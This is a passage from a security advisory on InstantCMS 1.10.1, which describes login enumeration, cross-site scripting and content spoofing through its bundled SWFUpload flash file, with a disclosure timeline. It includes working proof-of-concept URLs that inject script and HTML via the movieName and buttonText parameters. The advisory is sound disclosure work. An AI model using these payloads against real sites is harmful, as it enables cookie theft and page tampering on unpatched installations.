Login Enumeration (WASC-42):

http://site/users/login

It's possible to reveal logins by users' profiles. And also logins of the users are shown in many sections of the site (at users page and others), because developers don't care about leakage of logins of the users. In the next advisory about InstantCMS I'll give more example of such vulnerabilities.

Cross-Site Scripting (WASC-08):

http://site/includes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//

http://site/includes/swfupload/swfupload.swf?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%27%3EClick%20me%3C/a%3E

Content Spoofing (WASC-12):

http://site/includes/swfupload/swfupload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E

Timeline:
------------ 

In November 2012 and March 2013 I disclosed and wrote to the lists about vulnerabilities in SWFUpload. All who want fixed these holes, but not developers of InstantCMS.

2013.07.14 - found multiple vulnerabilities in InstantCMS 1.10.1.
2013.07.19 - informed developers about first part of the vulnerabilities. Ignored.
2013.07.30 - announced at my site.
2013.07.31 - informed developers about another part of the vulnerabilities. Answered, but refused to fix.
2013.08.02 - reminded developers about first letter with holes and explained why to fix them.
2013.08.02 - developers released InstantCMS 1.10.2 without fixing any informed vulnerabilities. All above-mentioned holes work in it.
2013.09.24 - disclosed at my site (http://websecurity.com.ua/6681/).
